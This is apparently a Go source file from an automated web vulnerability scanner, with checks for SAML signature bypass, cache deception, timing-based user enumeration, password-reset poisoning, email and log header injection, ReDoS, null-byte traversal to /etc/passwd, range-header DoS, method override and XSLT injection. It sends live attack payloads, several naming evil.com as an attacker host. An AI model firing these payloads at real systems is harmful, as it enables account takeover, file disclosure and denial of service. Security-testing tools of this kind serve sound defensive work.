package scanner

import (
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/zanicool/apex-cli/pkg/crawler"
	"github.com/zanicool/apex-cli/pkg/engine"
	"github.com/zanicool/apex-cli/pkg/oob"
)

func scanSAML(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	samlPaths := []string{"/saml/acs", "/saml/login", "/auth/saml", "/sso/saml", "/api/saml/callback"}
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	// SAML signature wrapping / comment injection
	samlPayloads := []string{
		`<samlp:Response><saml:Assertion><saml:Subject><saml:NameID>admin@evil.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>`,
		`<samlp:Response><!--injected--><saml:Assertion><saml:Subject><saml:NameID>admin</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>`,
	}
	for _, path := range samlPaths {
		url := baseURL + path
		for _, pl := range samlPayloads {
			resp := http.Post(url, "application/xml", pl)
			if resp.Err == nil && resp.StatusCode == 200 && (strings.Contains(resp.Body, "admin") || strings.Contains(resp.Body, "token") || strings.Contains(resp.Body, "session")) {
				findings = append(findings, Finding{Type: "SAML Injection — Signature Bypass", Severity: "critical", URL: url, Detail: "SAML response accepted without proper signature validation", Template: "apex-saml"})
				break
			}
		}
	}
	return findings
}

func scanWebCacheDeception(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Append static extension to dynamic pages
	extensions := []string{".css", ".js", ".png", ".jpg", ".ico", ".svg"}
	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		baseResp := http.Get(page.URL)
		if baseResp.Err != nil || baseResp.StatusCode != 200 {
			continue
		}
		for _, ext := range extensions {
			testURL := strings.TrimRight(page.URL, "/") + "/nonexist" + ext
			resp := http.Get(testURL)
			if resp.Err == nil && resp.StatusCode == 200 && resp.Body == baseResp.Body {
				// Check if it's cached
				cacheHeaders := resp.Headers.Get("X-Cache") + resp.Headers.Get("CF-Cache-Status") + resp.Headers.Get("Age")
				if strings.Contains(strings.ToLower(cacheHeaders), "hit") || resp.Headers.Get("Age") != "" {
					findings = append(findings, Finding{Type: "Web Cache Deception", Severity: "high", URL: testURL, Detail: fmt.Sprintf("Dynamic content served and cached with %s extension", ext), Template: "apex-cache-deception"})
					break
				}
			}
		}
	}
	return findings
}

func scanTimingAttacks(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// User enumeration via timing
	loginPaths := []string{"/login", "/api/login", "/auth/login", "/api/auth/signin"}
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	for _, path := range loginPaths {
		url := baseURL + path
		// Time with valid-looking vs invalid username
		var validTimes, invalidTimes []time.Duration
		for i := 0; i < 3; i++ {
			r1 := http.Post(url, "application/json", `{"username":"admin","password":"wrong123"}`)
			if r1.Err == nil && r1.StatusCode != 404 {
				validTimes = append(validTimes, r1.Duration)
			}
			r2 := http.Post(url, "application/json", `{"username":"xyznonexist99","password":"wrong123"}`)
			if r2.Err == nil && r2.StatusCode != 404 {
				invalidTimes = append(invalidTimes, r2.Duration)
			}
		}
		if len(validTimes) >= 3 && len(invalidTimes) >= 3 {
			avgValid := (validTimes[0] + validTimes[1] + validTimes[2]) / 3
			avgInvalid := (invalidTimes[0] + invalidTimes[1] + invalidTimes[2]) / 3
			diff := avgValid - avgInvalid
			if diff < 0 {
				diff = -diff
			}
			if diff > 100*time.Millisecond {
				findings = append(findings, Finding{Type: "Timing-Based User Enumeration", Severity: "medium", URL: url, Detail: fmt.Sprintf("Response time difference: %v (valid user) vs %v (invalid user)", avgValid, avgInvalid), Template: "apex-timing-enum"})
			}
		}
	}
	return findings
}

func scanAccountTakeover(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	if len(crawl.Pages) == 0 {
		return findings
	}
	baseURL := strings.Split(crawl.Pages[0].URL, "/")[0] + "//" + strings.Split(crawl.Pages[0].URL, "/")[2]
	// Password reset token predictability
	resetPaths := []string{"/forgot-password", "/api/auth/forgot", "/api/password/reset", "/reset-password"}
	for _, path := range resetPaths {
		url := baseURL + path
		resp := http.Post(url, "application/json", `{"email":"test@test.com"}`)
		if resp.Err != nil || resp.StatusCode == 404 {
			continue
		}
		// Test host header poisoning on reset
		items := []engine.RequestItem{{URL: url, Method: "POST", Headers: map[string]string{"Host": "evil.com", "Content-Type": "application/json"}}}
		for r := range http.BatchRequest(items, 1) {
			if r.Err == nil && r.StatusCode == 200 && strings.Contains(r.Body, "evil.com") {
				findings = append(findings, Finding{Type: "Account Takeover — Password Reset Poisoning", Severity: "critical", URL: url, Detail: "Reset link uses attacker Host header", Template: "apex-ato-reset"})
			}
		}
		// Test response manipulation (change email in response)
		resp2 := http.Post(url, "application/json", `{"email":"victim@target.com","new_email":"attacker@evil.com"}`)
		if resp2.Err == nil && resp2.StatusCode == 200 {
			findings = append(findings, Finding{Type: "Account Takeover — Email Change Without Verification", Severity: "high", URL: url, Detail: "Email change accepted without current password/2FA", Template: "apex-ato-email"})
		}
	}
	return findings
}

func scanEmailInjection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	emailPayloads := []string{
		"test@test.com%0aCc:attacker@evil.com",
		"test@test.com\r\nBcc:attacker@evil.com",
		"test@test.com%0d%0aTo:attacker@evil.com",
	}
	for _, form := range crawl.Forms {
		for _, inp := range form.Inputs {
			if !strings.Contains(strings.ToLower(inp.Name), "email") && !strings.Contains(strings.ToLower(inp.Name), "to") && !strings.Contains(strings.ToLower(inp.Name), "from") {
				continue
			}
			for _, pl := range emailPayloads {
				data := inp.Name + "=" + pl
				resp := http.Post(form.Action, "application/x-www-form-urlencoded", data)
				if resp.Err == nil && resp.StatusCode == 200 && !strings.Contains(strings.ToLower(resp.Body), "invalid") {
					findings = append(findings, Finding{Type: "Email Header Injection", Severity: "high", URL: form.Action, Param: inp.Name, Payload: pl, Detail: "Email header injection — can send emails to arbitrary recipients", Template: "apex-email-inject"})
					break
				}
			}
		}
	}
	return findings
}

func scanReDoS(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Payloads that trigger catastrophic backtracking
	redosPayloads := []string{
		strings.Repeat("a", 50) + "!",
		strings.Repeat("a", 30) + "@" + strings.Repeat("a", 30) + ".com!",
		"<" + strings.Repeat("a", 50) + ">",
	}
	for u, params := range crawl.Params {
		for _, p := range params {
			for _, pl := range redosPayloads {
				testURL := injectParam(u, p, pl)
				resp := http.Get(testURL)
				if resp.Err == nil && resp.Duration > 3*time.Second {
					findings = append(findings, Finding{Type: "ReDoS — Regular Expression Denial of Service", Severity: "medium", URL: testURL, Param: p, Detail: fmt.Sprintf("Response took %.1fs with regex-evil payload", resp.Duration.Seconds()), Template: "apex-redos"})
					break
				}
			}
		}
	}
	return findings
}

func scanNullByte(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	for u, params := range crawl.Params {
		for _, p := range params {
			testURL := injectParam(u, p, "../../../etc/passwd%00.jpg")
			resp := http.Get(testURL)
			if resp.Err == nil && strings.Contains(resp.Body, "root:") {
				findings = append(findings, Finding{Type: "Null Byte Injection — File Access", Severity: "critical", URL: testURL, Param: p, Template: "apex-null-byte"})
			}
		}
	}
	return findings
}

func scanRangeAmplification(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// HTTP Range header DoS
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		items := []engine.RequestItem{{URL: page.URL, Method: "GET", Headers: map[string]string{"Range": "bytes=0-,1-,2-,3-,4-,5-,6-,7-,8-,9-,10-,11-,12-,13-,14-"}}}
		for resp := range http.BatchRequest(items, 1) {
			if resp.Err == nil && resp.StatusCode == 206 && resp.Size > 1000 {
				findings = append(findings, Finding{Type: "HTTP Range Amplification DoS", Severity: "medium", URL: page.URL, Detail: fmt.Sprintf("Server processes overlapping ranges — %d bytes response for multi-range request", resp.Size), Template: "apex-range-dos"})
			}
		}
	}
	return findings
}

func scanHopByHop(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	// Hop-by-hop header abuse to strip security headers
	for _, page := range crawl.Pages[:min(5, len(crawl.Pages))] {
		items := []engine.RequestItem{{URL: page.URL, Method: "GET", Headers: map[string]string{"Connection": "close, X-Forwarded-For, X-Real-IP"}}}
		for resp := range http.BatchRequest(items, 1) {
			if resp.Err == nil && resp.StatusCode == 200 {
				// Compare with normal request
				normal := http.Get(page.URL)
				if normal.Err == nil && normal.Body != resp.Body {
					findings = append(findings, Finding{Type: "Hop-by-Hop Header Abuse", Severity: "medium", URL: page.URL, Detail: "Connection header strips proxy headers — potential access control bypass", Template: "apex-hop-by-hop"})
				}
			}
		}
	}
	return findings
}

func scanMethodOverride(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	overrideHeaders := []string{"X-HTTP-Method-Override", "X-Method-Override", "X-HTTP-Method"}
	for _, page := range crawl.Pages[:min(10, len(crawl.Pages))] {
		for _, header := range overrideHeaders {
			items := []engine.RequestItem{{URL: page.URL, Method: "POST", Headers: map[string]string{header: "DELETE", "Content-Type": "application/json"}}}
			for resp := range http.BatchRequest(items, 1) {
				if resp.Err == nil && resp.StatusCode == 200 && resp.Body != "" {
					normalPost := http.Post(page.URL, "application/json", "{}")
					if normalPost.Err == nil && normalPost.Body != resp.Body {
						findings = append(findings, Finding{Type: "HTTP Method Override Accepted", Severity: "medium", URL: page.URL, Detail: fmt.Sprintf("%s: DELETE changes response — can bypass method restrictions", header), Template: "apex-method-override"})
						break
					}
				}
			}
		}
	}
	return findings
}

func scanXSLT(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	xsltPayload := `<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"><xsl:template match="/"><xsl:value-of select="system-property('xsl:vendor')"/></xsl:template></xsl:stylesheet>`
	for _, form := range crawl.Forms[:min(10, len(crawl.Forms))] {
		resp := http.Post(form.Action, "application/xml", xsltPayload)
		if resp.Err == nil && (strings.Contains(resp.Body, "libxslt") || strings.Contains(resp.Body, "Xalan") || strings.Contains(resp.Body, "Saxon") || strings.Contains(resp.Body, "Microsoft")) {
			findings = append(findings, Finding{Type: "XSLT Injection", Severity: "critical", URL: form.Action, Detail: "XSLT processor detected — file read and RCE possible", Template: "apex-xslt"})
		}
	}
	return findings
}

func scanLogInjection(cfg *engine.Config, http *engine.HTTPClient, crawl *crawler.Result, _ *oob.Client) []Finding {
	var findings []Finding
	logPayloads := []string{
		"admin%0a[CRITICAL] Unauthorized access from 127.0.0.1",
		"test\r\n[INFO] User admin logged in successfully",
	}
	for u, params := range crawl.Params {
		for _, p := range params {
			for _, pl := range logPayloads {
				testURL := injectParam(u, p, pl)
				http.Get(testURL) // Fire and forget — log injection is blind
			}
		}
	}
	// Log injection is typically blind, report as informational if params exist
	if len(crawl.Params) > 0 {
		findings = append(findings, Finding{Type: "Log Injection Attempted", Severity: "info", URL: "multiple", Detail: "CRLF payloads sent to all parameters — check server logs for injection", Template: "apex-log-inject"})
	}
	return findings
}

var _ = sync.Mutex{} // ensure sync imported
